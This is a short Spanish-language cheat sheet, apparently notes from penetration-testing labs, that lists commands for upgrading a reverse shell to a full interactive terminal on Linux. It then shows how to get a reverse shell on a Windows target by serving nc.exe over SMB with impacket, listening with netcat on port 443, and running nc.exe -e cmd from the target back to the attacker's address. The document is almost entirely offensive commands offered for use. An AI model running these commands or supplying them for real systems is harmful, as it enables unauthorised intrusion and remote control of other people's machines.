>`script /dev/null -c bash` || `python -c 'import pty;pty.spawn("/bin/bash")'`
>`ctrl_z`
>`stty raw -echo; fg`
>`reset`
>`xterm`
>`export TERM=xterm`
>`export SHELL=bash`
>`stty rows 43 columns 157`

Cambiar a una full-tty cuando estamos en una máquina Windows:
> En local, montamos un servidor SMB compartiendo nc.exe
> `impacket-smbserver smbFolder $(pwd) -smb2support`
> En local, dejar puerto en escucha con netcat en espera de una reverse shell
> `rlwrap nc -nlvp 443`
> Desde la máquina objetivo, hacer uso del recurso compartido nc.exe y levantar una shell inversa
> `\\10.10.14.20\smbFolder\nc.exe -e cmd 10.10.14.20 443`
